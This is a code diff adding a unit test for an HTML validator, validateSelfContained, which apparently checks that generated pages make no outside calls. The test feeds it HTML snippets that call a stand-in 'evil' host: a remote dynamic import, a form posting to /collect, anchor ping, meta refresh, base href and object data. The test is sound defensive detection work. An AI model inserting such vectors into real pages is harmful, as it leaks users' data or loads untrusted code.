@@ -45,6 +45,24 @@ test("validateSelfContained flags protocol-relative src", () => {
   assert.ok(v.some((s) => /external src/.test(s)), v.join(" | "));
 });
 
+test("validateSelfContained flags the additional exfil/load vectors", () => {
+  const cases: [string, RegExp][] = [
+    [`<img srcset="https://cdn/x.png 1x">`, /srcset/],
+    [`<script>import("https://evil/x.js")</script>`, /dynamic import/],
+    [`<script>navigator.sendBeacon("/log", d)</script>`, /sendBeacon/],
+    [`<form action="https://evil/collect"></form>`, /form action/],
+    [`<a ping="https://evil/track">x</a>`, /anchor ping/],
+    [`<meta http-equiv="refresh" content="0;url=https://evil">`, /meta refresh/],
+    [`<base href="https://evil/">`, /base href/],
+    [`<object data="https://evil/x.swf"></object>`, /object\/embed data/],
+    [`<script type="importmap">{"imports":{}}</script>`, /import map/],
+  ];
+  for (const [html, expected] of cases) {
+    const v = validateSelfContained(html);
+    assert.ok(v.some((s) => expected.test(s)), `expected ${expected} for ${html}; got ${v.join(" | ")}`);
+  }
+});
+
 test("parseMeta accepts a complete meta object", () => {
   const meta = parseMeta(
     JSON.stringify({
